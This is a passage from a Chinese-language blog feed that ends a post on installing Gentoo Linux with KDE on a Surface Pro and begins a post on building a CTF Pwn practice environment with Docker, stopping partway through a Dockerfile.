</span><span class="language-bash">systemd-firstboot --prompt</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl preset-all --preset-mode=enable-only</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl preset-all</span><br></code></pre></td></tr></table></figure><blockquote><p>（可选）配置文件索引</p><p>通过空间换时间的方式加快文件搜索速度：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-apps/mlocate</span><br></code></pre></td></tr></table></figure></blockquote><p>配置 shell 自动补全，gentoo 默认使用 bash：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask app-shells/bash-completion</span><br></code></pre></td></tr></table></figure><p>配置时间同步：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask net-misc/chrony</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> chronyd.service</span><br></code></pre></td></tr></table></figure><p>配置文件系统和磁盘相关的一些工具，笔者只用 ext4 和 fat32：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-fs/e2fsprogs</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-fs/dosfstools</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-block/io-scheduler-udev-rules</span><br></code></pre></td></tr></table></figure><p>安装网络相关的一些包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask net-dialup/ppp</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask net-wireless/iw net-wireless/wpa_supplicant</span><br></code></pre></td></tr></table></figure><p>安装 NetworkManager：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask net-misc/networkmanager</span><br></code></pre></td></tr></table></figure><p>完成后我们通过修改 <code>/etc/portage/make.conf</code> 中的 USE flags 添加相关软件对 NetworkManager 的支持：</p><blockquote><p>添加完 USE flags 后别忘了通过如下命令进行更新：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask --changed-use --deep @world</span><br></code></pre></td></tr></table></figure></blockquote><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">USE</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;$&#123;USE&#125; networkmanager&quot;</span><br></code></pre></td></tr></table></figure><p>完成安装后启用对应的 systemd service：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> NetworkManager</span><br></code></pre></td></tr></table></figure><p>安装 sudo ，解注释 <code>%wheel ALL=(ALL:ALL) ALL</code> 所在行： </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask app-admin/sudo</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">visudo</span><br></code></pre></td></tr></table></figure><p>前面我们只配置了 root 用户，所以别忘了配置一个日常用的管理员用户：</p><blockquote><p>这里会报一个 <code>Creating mailbox file: No such file or directory</code> 的错误，可以不用管</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">groupadd arttnba3</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">useradd -g arttnba3 -m -G <span class="hljs-built_in">users</span>,wheel,audio,cdrom,floppy,portage,usb,video -s /bin/bash arttnba3</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">passwd arttnba3</span><br></code></pre></td></tr></table></figure><h2 id="安装-boot-loader"><a href="#安装-boot-loader" class="headerlink" title="安装 boot loader"></a>安装 boot loader</h2><p>按惯例直接用 GRUB 就行， <del>真的会有人去用 systemd-boot 🐴</del> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;GRUB_PLATFORMS=&quot;efi-64&quot;&#x27;</span> &gt;&gt; /etc/portage/make.conf</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask --update --newuse --verbose sys-boot/grub</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-boot/os-prober</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=Gentoo</span><br></code></pre></td></tr></table></figure><p>默认的 grub 主题比较难看，而且在高分辨率屏下看着属实有些难受，所以笔者这里选择安装一个 <a href="">minegrub</a> 主题，首先克隆仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask dev-vcs/git</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cd</span> ~</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/Lxtharia/minegrub-theme.git</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cd</span> ./minegrub-theme</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cp</span> -ruv ./minegrub /boot/grub/themes/</span><br></code></pre></td></tr></table></figure><p>接下来修改 grub 配置文件 <code>/etc/default/grub</code>：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">GRUB_THEME=<span class="hljs-regexp">/boot/g</span>rub<span class="hljs-regexp">/themes/mi</span>negrub/theme.txt<br></code></pre></td></tr></table></figure><p>添加自动更新背景字体的 systemd 服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cp</span> ./minegrub-update.service /etc/systemd/system</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> minegrub-update.service</span><br></code></pre></td></tr></table></figure><p>最后将 grub 配置写入 grub.cfg 中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">grub-mkconfig -o /boot/grub/grub.cfg</span><br></code></pre></td></tr></table></figure><p>最后重启系统，别忘了拔 u 盘：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">exit</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">umount -l /mnt/gentoo/dev&#123;/shm,/pts,&#125;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">umount -R /mnt/gentoo</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">reboot</span><br></code></pre></td></tr></table></figure><p>进入系统后我们用 os-probe 完成双系统引导中对 Windows 的检测以及 grub entry 的生成（当然如果你比较闲也可以手写），这里别忘了检查 <code>/etc/default/grub</code> 中是否有 <code>GRUB_DISABLE_OS_PROBER=false</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">grub-mkconfig -o /boot/grub/grub.cfg</span><br></code></pre></td></tr></table></figure><h2 id="安装-KDE-Wayland"><a href="#安装-KDE-Wayland" class="headerlink" title="安装 KDE + Wayland"></a>安装 KDE + Wayland</h2><p>首先按惯例连接网络：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nmtui</span><br></code></pre></td></tr></table></figure><p>然后安装  <a href="https://packages.gentoo.org/packages/kde-plasma/plasma-meta">kde-plasma&#x2F;plasma-meta</a> 和  <a href="https://packages.gentoo.org/packages/kde-apps/kde-apps-meta">kde-apps&#x2F;kde-apps-meta</a>，不过不同于其他的滚动发行版（Arch、openSUSE Tumbleweed、Debian Sid 等）或是贴近上游的常规发行版（如 Fedora Spin），Gentoo 滚得比较慢，目前 stable 分支还停留在 KDE 5.27：</p><blockquote><p>如果你不想安装其中的部分组件，可以非常轻松地通过 USE flag 进行定义，例如 <code>USE=&quot;kde-plasma/plasma-meta -xwayland&quot;</code> 将不会安装 <code>xwayland</code> ，通过 <code>-sddm</code> flag 也可以将默认的 sddm 替换为 lightdm，可用的 USE flag 详见 <a href="https://wiki.gentoo.org/wiki/KDE">Gentoo wiki</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask kde-plasma/plasma-meta</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask kde-apps/kde-apps-meta</span><br></code></pre></td></tr></table></figure><blockquote><p>如果你和笔者一样使用类似 Surface Pro 的性能比较低下的笔记本，那么这个编译会耗费相当长的时间（至少数个小时），正所谓 <code>“一杯茶，一包烟，Gentoo编译一整天”</code> （笑）</p></blockquote><p>plasma-meta 包自带依赖 sddm ，直接启用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now sddm.service</span><br></code></pre></td></tr></table></figure><p>最后进入到大家熟悉的 KDE 桌面，非常好的是默认使用 wayland，但非常坏的是 Plasma 6 在各大发行版都铺开了的时候 Gentoo 这边还停在 <code>5.27</code> ：</p><p><img src="https://s2.loli.net/2024/05/06/kdpR871gunKx4wt.png"></p><blockquote><p>需要注意的是 Linux on Surface 由于缺少相应的触摸板驱动，触摸板使用体验极其糟糕，在系统设置中也无法被检测为触摸板</p></blockquote><h2 id="安装中文字体与输入法"><a href="#安装中文字体与输入法" class="headerlink" title="安装中文字体与输入法"></a>安装中文字体与输入法</h2><p>首先安装中文字体，毕竟大家都不喜欢看到一大片方块：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask media-fonts/arphicfonts</span><br></code></pre></td></tr></table></figure><p>中文输入法按惯例选择来自 Gentoo 中文社区的 fcitx ，不过默认被 masked 了，得先 unmasked 一下：</p><blockquote><p>如果没有，检查一下你的 <code>gentoo-zh</code> 仓库是否启用成功</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask --autounmask app-i18n/fcitx-meta</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo dispatch-conf <span class="hljs-comment"># 这里直接 u 就好</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask app-i18n/fcitx-meta app-i18n/fcitx-chinese-addons</span><br></code></pre></td></tr></table></figure><p>最后按惯例在设置的 <code>virtual keyboard</code> 里选中 <code>fcitx5</code> ，然后右键 panel 的小企鹅图标找 <code>Pinyin</code> 即可：</p><p><img src="https://s2.loli.net/2024/05/08/Fau4LnKdUomslJY.jpg" alt="image.png"></p><blockquote><p>笔者不得不吐槽的一句是软件包非常老，在各大主流发行版 <code>fcitx5</code> 早已全面铺开的时代，Gentoo 这边刚刚上到 rc 版本，同时 <code>cloudpinyin</code> 和 <code>libpinyin</code> 都还停留在 fcitx4 …不过这可能也是相当多开源社区存在的问题了，维护人员越来越少+用户出走逐渐形成恶性循环，马太效应诚不我欺.jpg</p></blockquote><h2 id="安装常用软件"><a href="#安装常用软件" class="headerlink" title="安装常用软件"></a>安装常用软件</h2><blockquote><p>因为笔者没有协议洁癖所以前面设置了接受所有协议，如果你有但是又需要安装部分软件则需要参照 wiki 手动修改 <code>/etc/portage/package.license</code> ：）</p></blockquote><p>首先是 chrome，有社区从 deb 重新打的包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask www-client/google-chrome</span><br></code></pre></td></tr></table></figure><p>以及 vscode：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask app-editors/vscode</span><br></code></pre></td></tr></table></figure><p>flatpak 用以补充一些 Gentoo 上没有的软件包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask sys-apps/flatpak</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">flatpak remote-add --user --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo</span><br></code></pre></td></tr></table></figure><p>然后是中国大陆这边常用的微信，虽然官方 Linux 版特供 UOS、OpenKylin 等国产发行版，但<a href="https://github.com/web1n/wechat-universal-flatpak">有人打了一个绕过发行版检测的 flatpak 的包</a> ，所以直接而下载后安装即可：</p><blockquote><p>flathub 上也有，不过版本稍老</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">flatpak install com.tencent.WeChat.flatpak</span><br></code></pre></td></tr></table></figure><p>QQ Linux 版提供了 AppImage 可用，不过还需要提前安个依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask app-crypt/mit-krb5</span><br></code></pre></td></tr></table></figure><p>之后随便放到个目录里然后写个 shortcut 放到 <code>~/.local/share/applications</code> 下就行：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Desktop Entry]</span><br><span class="hljs-attr">Name</span>=QQ<br><span class="hljs-attr">GenericName</span>=Tencent QQ<br><span class="hljs-attr">Exec</span>=/home/arttnba3/Applications/QQ/QQ_3.<span class="hljs-number">2.7</span>_240422_x<span class="hljs-number">86_64_01</span>.appimage<br><span class="hljs-attr">Version</span>=<span class="hljs-number">3.2</span>.<span class="hljs-number">7.240422</span><br><span class="hljs-attr">Type</span>=Application<br><span class="hljs-attr">Categories</span>=Network<span class="hljs-comment">;</span><br><span class="hljs-attr">Terminal</span>=<span class="hljs-literal">false</span><br><span class="hljs-attr">Icon</span>=com.qq.QQ<br></code></pre></td></tr></table></figure><h1 id="0x03-遇到的一些问题"><a href="#0x03-遇到的一些问题" class="headerlink" title="0x03. 遇到的一些问题"></a>0x03. 遇到的一些问题</h1><h2 id="触摸板驱动问题（not-solved）"><a href="#触摸板驱动问题（not-solved）" class="headerlink" title="触摸板驱动问题（not solved）"></a>触摸板驱动问题（not solved）</h2><p>主要表现：</p><ul><li>启动后点按有效，但是多指手势（如双指&#x3D;&#x3D;右键）无效</li><li>按下触摸板左右键后<strong>点按失效</strong></li><li>在 KDE 系统设置中无法检测到触摸板</li></ul><p>基本上只能当作一个最简陋的触摸板来用，笔者最初感觉主要可能是微软触摸板缺少驱动的问题，毕竟在安装 Windows 时在没更新驱动前也没法用键盘和触摸板（ <del>微软怎么天天搞特殊，忍不了一点，真的有必要🐴</del> ）</p><p><strong>但是，笔者在 openSUSE Tumbleweed on Surface 中可以正常使用触摸板及多指手势</strong> ，那这就有意思了，这么看起来似乎是笔者在编译内核时并未将部分必须的驱动给编译进去，又或是没有安装部分必须的软件，笔者更倾向于前者的缘故🤔</p><h2 id="摄像头无法使用（not-solved）"><a href="#摄像头无法使用（not-solved）" class="headerlink" title="摄像头无法使用（not solved）"></a>摄像头无法使用（not solved）</h2><p>应该也是经典的缺驱动问题， <del>这就是你 Surface Pro 的屏摄像头啊，你们有没有这样的摄像头啊，真是摄摄像像又头头啊</del></p><h2 id="休眠无法正常唤醒"><a href="#休眠无法正常唤醒" class="headerlink" title="休眠无法正常唤醒"></a>休眠无法正常唤醒</h2><p>放个一会整个💻就睡死了，按键盘没法唤醒，最快的解决方案是把键盘拔了再重新插上， <del>这就是你 Surface Pro 的键盘啊，你们有没有这样的键盘啊，真是键键又盘盘啊</del></p><h2 id="Surface-Pen-无法使用（not-solved）"><a href="#Surface-Pen-无法使用（not-solved）" class="headerlink" title="Surface Pen 无法使用（not solved）"></a>Surface Pen 无法使用（not solved）</h2><p>应该也是经典的缺驱动问题， <del>不过真的有人会有在 Linux on Surface 上使用 Surface Pen 的需求🐴</del></p><h2 id="触屏无法正常使用（not-solved）"><a href="#触屏无法正常使用（not-solved）" class="headerlink" title="触屏无法正常使用（not solved）"></a>触屏无法正常使用（not solved）</h2><p>应该也是经典的缺驱动问题，Surface Pro 支持十点触控的高素质屏幕几乎成了摆设， <del>这就是你 Surface Pro 的屏幕啊，你们有没有这样的屏幕啊，真是屏屏又幕幕啊</del></p><h1 id="0xFF-写在结束之后…"><a href="#0xFF-写在结束之后…" class="headerlink" title="0xFF. 写在结束之后…"></a>0xFF. 写在结束之后…</h1><p>Distro hopping 的狂欢之火燃尽之后，剩下的似乎总是只有一地的灰烬，在笔者看来 <strong>Gentoo Linux 在安装流程上其实和 Arch Linux 基本差不多</strong>，所以对于笔者而言还是比较轻车熟路的，但在尝试了几小时 Gentoo Linux 后，笔者最终还是选择重新装回 openSUSE Tumbleweed，触摸板一开始就是正常可用的，也没有休眠醒不来的问题，甚至触屏功能在安装了社区提供的 <a href="https://github.com/linux-surface/linux-surface">linux-surface</a> 包之后也正常可用了，唯一的遗憾就是 Surface Pen 与摄像头依旧没法工作，但其他的一切就像你在 Surface 上使用 Windows 那样自然与舒适</p><p><img src="https://s2.loli.net/2024/05/09/dnEDHtBzY7oOxCf.jpg" alt="舒舒又适适，但可惜的是电池健康在经历笔者大四一年的蹂躏之后已经只剩不到 90 了"></p><p>在回到了大蜥蜴温暖的怀抱当中后，笔者不禁思考：究竟是 Surface 这一特殊设备与 Gentoo 八字不合，还是笔者与 Gentoo Linux 在相性上不符呢？笔者自然不希望答案会是后者，但当笔者尝试在另一台旧笔记本上安装 Gentoo Linux 并再次碰到各种问题（例如 Dolphin 和触摸板无法正常工作）时，<strong>笔者不得不承认或许 Gentoo 这个特殊的发行版与笔者在某种程度上有点犯冲</strong>，而这样的两段安装经历也让笔者彻底打消了将主力操作系统从 openSUSE Tumbleweed 换成 Gentoo 的念头</p><p>除此之外，Gentoo 的各种优点似乎也没有理想中的那么好，作为一个滚动发行版，Gentoo 明显是没有 Arch、openSUSE Tumbleweed、Fedora 这样紧贴上游的（当然，如果能实现所谓“调试好了再发布”，那在能确保稳定性的情况下软件包旧一点其实无所谓，但事实上他们似乎并没有能做到这一点）； <code>USE flag</code> 等配置听起来舒服，但是大部分情况下其实并不需要这样的特性，和其他发行版的包管理器的使用体验拉不开差距（当然，大部分情况下一个包管理器又能想要多不一样的体验呢？）；Gentoo wiki 以前一直都被吹嘘能和 Arch wiki 有得一拼，但真正用起来能清晰感受到在内容上前者很明显差了后者好几个档次……</p><p>但这些其实都是小问题，毕竟 Linux 用户和苹果用户一样有着非常强的自适应性，尤其是在使用 Arch&#x2F;Gentoo 这样的高度自定义的发行版的时候，出现问题了大家总会第一时间自适应地认为“是不是自己什么地方没有配置好”，可惜 Gentoo 社区一直在走下坡路却是一个不争的事实，虽然 Gentoo 听起来似乎有着各式各样不同的优点，但使用的人数确乎一直在慢慢减少，也很少有新鲜血液加入，因此很多软件包也没人打，在论坛问问题也没人回复，这又导致没人愿意继续用 Gentoo ——对于 Gentoo 社区所遇到的“马太效应“的问题，笔者思考了许久，感觉似乎没有一个比较好的解决方案，而这似乎是所有规模比较小的发行版都会遇到的问题，发行版用的人少导致社区缺少人维护从而导致系统没有那么好用，系统可用性的降低又使得人员出走，最后“强者愈强，弱者愈弱”</p><p>——而对于这个不得不被正视的问题，<strong>社区除了等死以外似乎并没有什么能做的事情</strong>，但同样是支持高度定制的系统，Gentoo 和 Arch 的命运为什么差得越来越多了呢？</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;省流：最后装回了 openSUSE Tumbleweed&lt;/p&gt;</summary>
    
    
    
    <category term="DISTRO" scheme="https://arttnba3.github.io/categories/DISTRO/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Gentoo Linux" scheme="https://arttnba3.github.io/tags/Gentoo-Linux/"/>
    
  </entry>
  
  <entry>
    <title>【PWN.0x03】Linux x86 用户态 Pwn 基本环境搭建</title>
    <link href="https://arttnba3.github.io/2024/03/31/PWN-0X03-USERMODE-ENV/"/>
    <id>https://arttnba3.github.io/2024/03/31/PWN-0X03-USERMODE-ENV/</id>
    <published>2024-03-31T04:21:45.000Z</published>
    <updated>2024-05-14T17:08:45.995Z</updated>
    
    <content type="html"><![CDATA[<p>信 Docker ，得永生</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">CTF-wiki</a> 上 Linux 用户态 Pwn 环境搭建的部分 Wiki 组咕了好久了， <em>作为 Pwn 模块默认的第一个页面，一直空着总归不是那么地雅观</em> ，因此作为 Wiki 组为数不多的活人（虽然也只是半个活死人罢了， <del>问就是 Wiki 组包括笔者在内的全员都在和牢大打复活赛</del> ），笔者决定还是找个时间给这一块补充上</p><p>虽然笔者已经很久很久很久没有正经做过用户态 Pwn 了，不过如果只是基础的常规题型的话，需要的工具其实基本上是万年不变的，因此笔者找了个时间（ <del>其实就是在实验室偷偷摸鱼</del> ）给这块内容稍微补充了一下，顺便水一篇博客这样子（ <del>因为太忙 + 太懒实在是没写东西，简单混点更新</del> ）</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>现有的 CTF Pwn 题主要以 Linux 下的用户态 Pwn 为主，因此我们通常需要在本地拥有一个 Linux 运行环境，这通常可以通过安装 Linux 虚拟机来完成，此外你也可以在物理机上安装 Linux 操作系统。</p><p>绝大多数 Linux Pwn 题目的远程环境以 <a href="https://ubuntu.com/">Ubuntu</a> 为主，因此为了方便在本地调试题目，你通常需要搭建一个与题目版本相匹配的 Ubuntu 运行环境，不过 <em>这并不意味着你必须要使用 Ubuntu 作为你的主力操作系统</em> 。你仍旧可以选择继续使用你喜欢的其他 Linux 发行版（如，Arch、Debian、openSUSE、Fedora、NixOS 等），并使用 Docker 来搭建相应的 Ubuntu 做题环境。</p><p>传统 CTF Pwn 题目通常仅需要以下工具便能完成解题：</p><ul><li>IDA：用于对题目进行逆向分析。</li><li>Python + pwntools：用于编写漏洞利用脚本。</li><li>gdb + pwndbg&#x2F;peda：用于调试题目二进制文件。</li></ul><p>需要注意的是，在初学阶段我们并不推荐任何基于 pwntools 进行过度二次包装的软件包，也不推荐你在利用脚本中使用 lambda 语句进行过度简化，我们更推荐你在学习到一定程度后再去根据个人使用习惯进行决定。</p><p>此外，部分题目可能需要一些额外的环境（例如 kernel pwn 需要 qemu），我们将在后续介绍到对应题目时单独进行介绍。</p><h1 id="0x01-使用-Docker-搭建-CTF-Pwn-做题环境（推荐）"><a href="#0x01-使用-Docker-搭建-CTF-Pwn-做题环境（推荐）" class="headerlink" title="0x01. 使用 Docker 搭建 CTF Pwn 做题环境（推荐）"></a>0x01. 使用 Docker 搭建 CTF Pwn 做题环境（推荐）</h1><p>为了保证利用脚本能够正常打通，我们通常需要在本地准备相同的运行环境，并在进行远程利用之前先在本地进行测试，但由于 CTF 题目远程环境众多，若是为每个不同的环境都单独准备一个 Ubuntu 虚拟机，则不仅要在每个虚拟机上都完整搭建一遍调试环境，且会占用大量磁盘空间，同时也无法保证本地环境小版本和远程环境一定相同——除非每个小版本都单独创建一个虚拟机并永不升级，这种解决方案并不优雅。</p><p>通过 <code>LD_PRELOAD</code> 参数在程序执行前 预先加载 libc 在某些程度上是一个可行的解决方案，在 libc 大版本相同的情况下载入不同的小版本通常并不会出现问题，但是由于不同系统环境中 ld 版本不同的缘故，对于跨 ld 版本加载不同版本的 libc 则可能出现 segmentation fault，从而导致无法正常运行与调试题目。</p><p>虽然 Linux 的用户环境并不似 Windows 那样有着强壮的二进制前向兼容性，但是用户环境依托于内核环境、依托于内核向用户态暴露的接口——系统调用，而这并不是会轻易发生变动以及兼容性破坏的一个东西，由此，通过重新开辟一个对应的新的用户环境的方式—— 即形如 Docker 这样的操作系统层上的虚拟化方案，我们便能非常简单地搭建不同的 Pwn 题所对应的原始环境。</p><h2 id="Docker-环境搭建"><a href="#Docker-环境搭建" class="headerlink" title="Docker 环境搭建"></a>Docker 环境搭建</h2><p>Docker 的安装请大家根据自己所使用的 Linux 发行版自行参照 <a href="https://docs.docker.com/engine/install/">Docker 官网</a> 或是发行版自己的 Wiki 进行配置，这里不再赘叙。</p><h2 id="创建-Docker-镜像"><a href="#创建-Docker-镜像" class="headerlink" title="创建 Docker 镜像"></a>创建 Docker 镜像</h2><p>我们以以下 Dockerfile 所创建的镜像作为模板，大家可以根据自己的需求自行修改：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">22.04</span><br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-comment"># pre-install softwares</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span><br><span class="language-bash">    apt-get -y update &amp;&amp; \</span><br><span class="language-bash">    apt-get install -y lib32z1 apt-transport-https python3 python3-pip git \</span><br><span class="language-bash">    libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev \</span><br><span class="language-bash">    vim nano netcat openssh-server unzip make wget bison flex build-essential \</span><br><span 